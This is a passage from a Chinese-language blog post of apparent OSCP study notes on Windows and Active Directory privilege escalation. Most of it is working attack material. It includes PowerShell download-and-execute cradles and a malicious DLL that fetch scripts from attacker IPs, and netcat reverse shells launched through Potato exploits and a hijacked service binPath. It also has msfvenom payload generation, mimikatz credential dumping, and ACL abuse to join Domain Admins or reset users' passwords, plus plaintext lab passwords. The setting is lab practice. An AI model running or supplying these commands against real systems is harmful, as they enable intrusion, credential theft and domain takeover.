https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9

Seatbelt：
https://github.com/GhostPack/Seatbelt
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?tab=readme-ov-file
</code></pre><h1 id=服务提权>服务提权<a hidden class=anchor aria-hidden=true href=#服务提权>#</a></h1><pre tabindex=0><code>查找服务，并过滤不处于运行中的服务，注意非用户安装的，就是非常规**C:\Windows\System32**下面的：
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like &#39;Running&#39;} &gt; 2.txt

权限表：
MASK	PERMISSIONS
F	Full access
M	Modify access
RX	Read and execute access
R	Read-only access
W	Write-only access

查看服务启动模式：
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &#39;mysql&#39;}


Restart-Service xxx
Stop-Service xxx
</code></pre><h2 id=查找服务提权的ps脚本>查找服务提权的Ps脚本<a hidden class=anchor aria-hidden=true href=#查找服务提权的ps脚本>#</a></h2><pre tabindex=0><code>1、https://github.com/itm4n/PrivescCheck.git


http远程调用：
powershell -nop -exec bypass -c &#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.16.9/PrivescCheck.ps1&#39;);Invoke-PrivescCheck&#34;


2、https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
使用方法：
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile


微软官方，powershell管理服务的方法：
https://learn.microsoft.com/zh-cn/powershell/scripting/samples/managing-services?view=powershell-7.4#stopping-starting-suspending-and-restarting-services
</code></pre><h2 id=dll劫持需要rdp>DLL劫持(需要RDP）<a hidden class=anchor aria-hidden=true href=#dll劫持需要rdp>#</a></h2><p>下载软件：
<a href=https://learn.microsoft.com/en-us/sysinternals/downloads/procmon>https://learn.microsoft.com/en-us/sysinternals/downloads/procmon</a></p><p>dll.cpp</p><pre tabindex=0><code>#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system (&#34;powershell.exe -nop -w hidden -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.240/nishang.ps1&#39;)&#34;);
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
</code></pre><p>编译：</p><pre tabindex=0><code>x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
</code></pre><p>路径，以下目录皆可：</p><pre tabindex=0><code>$env:path
</code></pre><h2 id=服务路径提权>服务路径提权<a hidden class=anchor aria-hidden=true href=#服务路径提权>#</a></h2><pre tabindex=0><code>查找，首先找到非常规目录的服务：
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
或者：
wmic service get name,pathname |  findstr /i /v &#34;C:\Windows\\&#34; | findstr /i /v &#34;&#34;&#34;


如果显示程序占用可以使用move:

move bd.exe original.exe

然后确认是否具备重启服务，或者服务自动启动+重启机器的权限
Restart-Service GammaService
net stop mysql

重启机器，如果没有权限修改服务的情况下：
必须拥有SeShutDownPrivilege权限：
shutdown /r /t 0

随后确认路径是否具备写入权限：
icacls &#34;C:\Program Files&#34;

随后写入，然后重新启动

Restart-Service GammaService

值得注意的是，软件名字为带空格的目录的第一个单词，
举例：
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe


小技巧：
可以使用正则表达式：
.*\bsvchost\b.*
.*&#34;.*
</code></pre><h1 id=计划任务提权>计划任务提权<a hidden class=anchor aria-hidden=true href=#计划任务提权>#</a></h1><p>Scheduled Applications</p><pre tabindex=0><code>查看计划任务：
schtasks /query /fo LIST /v


查看目录权限：
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
</code></pre><h1 id=提权wiki>提权WIKI<a hidden class=anchor aria-hidden=true href=#提权wiki>#</a></h1><pre tabindex=0><code>https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9

这里面也有域内的漏洞：
https://github.com/SecWiki/windows-kernel-exploits
</code></pre><h1 id=特权提权>特权提权<a hidden class=anchor aria-hidden=true href=#特权提权>#</a></h1><pre tabindex=0><code>https://github.com/gtworek/Priv2Admin
</code></pre><h1 id=semanagevolume>SeManageVolume<a hidden class=anchor aria-hidden=true href=#semanagevolume>#</a></h1><p>运行即可获取C盘所有读写权限，利用DLL劫持，systeminfo即可提权</p><pre tabindex=0><code>https://github.com/CsEnox/SeManageVolumeExploit/
</code></pre><h1 id=seimpersonateprivilege提权>SeImpersonatePrivilege提权<a hidden class=anchor aria-hidden=true href=#seimpersonateprivilege提权>#</a></h1><p>土豆家族：</p><p><a href=https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Windows%E6%8F%90%E6%9D%83/JuicyPotato.md>https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Windows%E6%8F%90%E6%9D%83/JuicyPotato.md</a></p><p>总结
如果机器 >= Windows 10 1809 & Windows Server 2019 试试Rogue Potato
如果机器 &lt; Windows 10 1809 &lt; Windows Server 2019 试试Juicy Potato</p><p>神薯
<a href=https://github.com/BeichenDream/GodPotato/releases/tag/V1.20>https://github.com/BeichenDream/GodPotato/releases/tag/V1.20</a></p><p>RoguePotato</p><pre tabindex=0><code>资料
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato

github
https://github.com/antonioCoco/RoguePotato?tab=readme-ov-file

juicypotato可以从服务账户提权，服务账户的权限也需要进行检查


kali:
sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999

nc -lvvp 4444

windows:
RoguePotato.exe -r 192.168.45.194 -e &#34;c:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 192.168.45.194 4444&#34; -l 9999

查找CLSID
https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/
RoguePotato.exe -r 192.168.45.185 -c &#34;{6d8ff8df-730d-11d4-bf42-00b0d0118b56}&#34; -e &#34;c:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe 192.168.45.185 4444&#34; -l 9999
</code></pre><p>roguepotato-and-printspoofer</p><pre tabindex=0><code>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
</code></pre><p>SweetPotato&amp;printspoofer</p><pre tabindex=0><code>SeImpersonatePrivilege 权限才行
https://github.com/uknowsec/SweetPotato?tab=readme-ov-file

SweetPotato.exe -a whoami



wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

.\PrintSpoofer64.exe -i -c powershell.exe
</code></pre><p><a href=https://github.com/uknowsec/JuicyPotato>https://github.com/uknowsec/JuicyPotato</a> 推荐这个，webshell版本</p><pre tabindex=0><code>JuicyPotato_x32.exe -l 1337 -c &#34;{4991d34b-80a1-4291-83b6-3328366b9097}&#34; -p c:\windows\system32\spool\drivers\color\nc.exe -a &#34;-e cmd 192.168.45.184 4445&#34;
</code></pre><h1 id=常用内核提权>常用内核提权<a hidden class=anchor aria-hidden=true href=#常用内核提权>#</a></h1><pre tabindex=0><code>https://github.com/abatchy17/WindowsExploits
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools
</code></pre><h1 id=常见漏洞>常见漏洞<a hidden class=anchor aria-hidden=true href=#常见漏洞>#</a></h1><pre tabindex=0><code>&lt;1&gt; 远程漏洞

ms03-026

ms03-039 (1)

ms03-039 (2)

ms03-049

ms04-007

ms04-011 - ssl bof

ms04-011 - lsasarv.dll

ms04-031

ms05-017

ms05-039

ms06-040 (1)

ms06-040 (2)

ms06-070

ms08-067 (1)

ms08-067 (2)

ms08-067 (3)

ms09-050

&lt;2&gt; 本地漏洞

ms04-011

ms04-019 (1)

ms04-019 (2)

ms04-019 (3)

ms04-020

keybd_event

ms05-018

ms05-055

ms06-030

ms06-049

print spool service

ms08-025

netdde

ms10-015

ms10-059

ms10-092

ms11-080

ms14-040

ms14-058 (1)

ms14-058 (2)

ms14-070 (1)

ms14-070 (2)

ms15-010 (1)

ms15-010 (2)

**ms15-051**
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools

ms16-014

ms16-016

**ms16-032**
https://github.com/zcgonvh/MS16-032/releases/tag/Release
</code></pre><h1 id=meterpreter>meterpreter<a hidden class=anchor aria-hidden=true href=#meterpreter>#</a></h1><p>在整个学习期间，其实是尽量在减少对meterpreter的使用的，这里只记录一些常见的使用：</p><pre tabindex=0><code>迁移进程：
getpid  查看当前pid
ps 寻找可迁移的pid
migrate &lt;目标PID&gt;
</code></pre><p>查看远程活动窗口&截图</p><pre tabindex=0><code>qwinsta /server:127.0.0.1
</code></pre><h1 id=powershell>powershell<a hidden class=anchor aria-hidden=true href=#powershell>#</a></h1><pre tabindex=0><code>查看本地用户
Get-LocalUser
</code></pre><p>UnauthorizedAccess问题：</p><pre tabindex=0><code>查看权限：

Get-ExecutionPolicy -Scope CurrentUser

更改：
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
</code></pre><p>使用账号密码切换用户：</p><pre tabindex=0><code>方法一：
$passwd = ConvertTo-SecureString &#34;l33th4x0rhector&#34; -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential (&#34;hector&#34;, $passwd)
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {(Get-Acl -Path .\keepmeon).Access | Where-Object { $_.IdentityReference -eq $env:USERNAME } &#34;c:\Program Files\keepmeon&#34;} -credential $cred


方法二：
$password = convertto-securestring -AsPlainText -Force -String &#34;l33th4x0rhector&#34;  
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList &#34;CONTROL\hector&#34;,$password  
# testing  
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $credential


$passwd = ConvertTo-SecureString &#34;W3_4R3_th3_f0rce.&#34; -AsPlainText -force $cred = New-Object System.Management.Automation.PSCredential (&#34;acute\imonks&#34;, $passwd) Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {whoami} -credential $cred
</code></pre><p>pwoershell 修改文件内容：</p><pre tabindex=0><code>((Get-Content &#34;c:\users\imonks\Desktop\wm.ps1&#34; -Raw) -replace &#39;Get-Volume&#39;,&#39;cmd.exe /c c:\utils\cxk2.exe&#39;) | set-content -path c:\users\imonks\Desktop\wm.ps1
</code></pre><p>powershell历史记录位置</p><pre tabindex=0><code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
</code></pre><p>查看当前用户权限：</p><pre tabindex=0><code>whoami /priv
net user 用户名
</code></pre><p>powershell常用命令：</p><pre tabindex=0><code>获取系统信息：
Get-WmiObject -Class Win32_OperatingSystem
导入脚本：
import-module .\脚本
查看菜单：
menu

删除文件：
Remove-Item -Path C:\path\to\file.txt

powershell身份切换，类似于su的实现：

执行whoami:

$password = convertto-securestring -AsPlainText -Force -String &#34;36mEAhz/B8xQ~2VM&#34;;
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist &#34;SNIPER\chris&#34;,$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;

反弹shell:

执行程序
Start-Process -FilePath c:\users\nico\downloads\SharpHound.exe

powershell 绕过：

C:\WIndOWs\sySwOw64\WINdOwspOweRshEll\v1.0\poWersHeLl.Exe

查看隐藏文件：
Get-ChildItem -Force


身份切换方式2：
https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
import-module ./Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command &#34;whoami&#34;
</code></pre><p>列出文件树：</p><pre tabindex=0><code>Get-ChildItem -Recurse
</code></pre><p>文件查找：</p><pre tabindex=0><code>Get-ChildItem -Path C:\ -Include *flag* -File -Recurse -ErrorAction SilentlyContinue
</code></pre><h1 id=windows本地提权>windows本地提权<a hidden class=anchor aria-hidden=true href=#windows本地提权>#</a></h1><p>服务提权：</p><pre tabindex=0><code>1、创建服务：
sc.exe config vss binPath=&#34;C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2  1234&#34;
2、开启服务：
sc.exe stop vss  
sc.exe start vss
</code></pre><h2 id=权限赋予>权限赋予<a hidden class=anchor aria-hidden=true href=#权限赋予>#</a></h2><pre tabindex=0><code>授予权限：
icacls C:\path\to\your\directory /grant username:(permissions)
username: 要授予权限的用户名。
permissions: 要授予的权限。例如，F 表示完全控制，R 表示读取，W 表示写入等。可以使用多个字母组合，如 RW 表示读写权限。
</code></pre><h1 id=域内提权注意权限>域内提权注意权限：<a hidden class=anchor aria-hidden=true href=#域内提权注意权限>#</a></h1><pre tabindex=0><code>GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE&#39;s applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
</code></pre><h2 id=backup-operators组提权>BACKUP OPERATORS组提权<a hidden class=anchor aria-hidden=true href=#backup-operators组提权>#</a></h2><p>推荐</p><pre tabindex=0><code>https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/
</code></pre><p>资料</p><pre tabindex=0><code>https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#f402
</code></pre><pre tabindex=0><code>https://github.com/jakobfriedl/precompiled-binaries/tree/e6f7025e75dfc906d14e2fe33d0ebc6a321ece4a
</code></pre><pre tabindex=0><code>https://www.bordergate.co.uk/backup-operator-privilege-escalation/
</code></pre><p>推荐</p><pre tabindex=0><code>https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801
</code></pre><p>推荐</p><pre tabindex=0><code>https://www.thehacker.recipes/a-d/movement/credentials/dumping/sam-and-lsa-secrets
</code></pre><h2 id=genericwrite权限>GenericWrite权限<a hidden class=anchor aria-hidden=true href=#genericwrite权限>#</a></h2><pre tabindex=0><code>powerview

Set-DomainObject -Identity maria -SET @{scriptpath=&#34;C:\\Windows\\System32\\spool\\drivers\\color\\powercat.ps1&#34;}
</code></pre><h3 id=writeowner-组权限>WriteOwner 组权限<a hidden class=anchor aria-hidden=true href=#writeowner-组权限>#</a></h3><pre tabindex=0><code>upload PowerView.ps1
Import-Module .\PowerView.ps1

1。 设置为组所有者
Set-DomainObjectOwner -Identity &#39;Domain Admins&#39; -OwnerIdentity &#39;maria&#39;

2. 给自己授予全部权限
Add-DomainObjectAcl -TargetIdentity &#34;Domain Admins&#34; -PrincipalIdentity maria -Rights All

3. 把自己添加到dbadmin
Add-DomainGroupMember -Identity &#39;Domain Admins&#39; -Members &#39;maria&#39;
</code></pre><h3 id=writeowner-用户权限>WriteOwner 用户权限<a hidden class=anchor aria-hidden=true href=#writeowner-用户权限>#</a></h3><pre tabindex=0><code> . .\PowerView.ps1 //将PowerView导入
     把当前用户tom设置为claire用户的 ACL 的所有者并授予其修改密码的权限
    Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
    Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose
    设置claire的密码为Ab345678123!@#
    $cred = ConvertTo-SecureString &#34;Ab345678123!@#&#34; -AsPlainText -force
    Set-DomainUserPassword -identity claire -accountpassword $cred
</code></pre><h2 id=genericall-权限>Genericall 权限<a hidden class=anchor aria-hidden=true href=#genericall-权限>#</a></h2><pre tabindex=0><code>使用hash的方式修改密码，如果使用明文密码的话，取消最后面的--pw-nt-hash即可

net rpc password &#34;Tristan.Davies&#34; &#34;newP@ssword2023&#34; -U &#34;search.htb&#34;/&#34;BIR-ADFS-GMSA$&#34;  -S &#34;RESEARCH.search.htb&#34; --pw-nt-hash
</code></pre><h1 id=mimikatz>mimikatz<a hidden class=anchor aria-hidden=true href=#mimikatz>#</a></h1><pre tabindex=0><code>```第一步，提升权限：
privilege::debug
token::elevate

以所有方式获取密码：
sekurlsa::logonpasswords

以SAM获取密码：
lsadump::sam


导出TGT：
sekurlsa::tickets /export
查看TGT：
dir *.kirbi
导入TGT，后面的是TGT文件名字：
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

./mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; &#34;exit&#34; &gt;mimikatz.txt

./mimikatz.exe &#34;lsadump::sam /sam:c:\windows.old\Windows\System32\SAM /system:c:\windows.old\Windows\System32\SYSTEM&#34; &#34;exit&#34; &gt;&gt; sam.txt


./mimikatz.exe &#34;vault::list&#34; &#34;exit&#34; &gt;mimikatz.txt
</code></pre><p>更多使用方法：</p><pre tabindex=0><code>https://mp.weixin.qq.com/s/IDE2QEzVeuXk6liNeXhxpg
</code></pre><p>powershell版本：</p><pre tabindex=0><code>https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
</code></pre><h1 id=密码本和信息检索>密码本和信息检索<a hidden class=anchor aria-hidden=true href=#密码本和信息检索>#</a></h1><p>git</p><p>在软件目录中查找：</p><pre tabindex=0><code>Get-ChildItem -Path C:\xampp -Include *.ini -File -Recurse -ErrorAction SilentlyContinue

powershell &#34;Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue&#34;
</code></pre><p>在用户目录下查找：</p><pre tabindex=0><code>Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.xml,*.log,*.kdbx,*.exe -File -Recurse -ErrorAction SilentlyContinue
</code></pre><p>powershell历史记录：</p><pre tabindex=0><code>获取文件存储位置：
(Get-PSReadlineOption).HistorySavePath

事件查看器：
eventvwr.msc

Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational: 

Click Filter Current Log and search for 4104 events
</code></pre><p>flag隐藏：
备用数据流：</p><pre tabindex=0><code>C:\Users\Administrator\Desktop&gt;dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    &lt;DIR&gt;          .
11/08/2017  10:05 AM    &lt;DIR&gt;          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,440,134,656 bytes free
               
C:\Users\Administrator\Desktop&gt;powershell Get-Content -Path &#34;hm.txt&#34; -Stream &#34;root.txt&#34;
powershell Get-Content -Path &#34;hm.txt&#34; -Stream &#34;root.txt&#34;
afbc5bd4b615a60648cec41c6ac9253
</code></pre><h1 id=gui下的身份切换>GUI下的身份切换<a hidden class=anchor aria-hidden=true href=#gui下的身份切换>#</a></h1><pre tabindex=0><code>runas /user:backupadmin cmd
</code></pre><h1 id=c盘写入提权>C盘写入提权<a hidden class=anchor aria-hidden=true href=#c盘写入提权>#</a></h1><pre tabindex=0><code>systeminfo
c:\windows\system32\wbem
tzres.dll


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=135 -f dll -o tzres.dll
</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/oscp/web%E6%B8%97%E9%80%8F/><span class=title>« Prev</span><br><span>web渗透</span>
</a><a class=next href=https://yangzhuzai.github.io/posts/oscp/%E5%8F%8D%E5%BC%B9shell/><span class=title>Next »</span><br><span>反弹shell</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>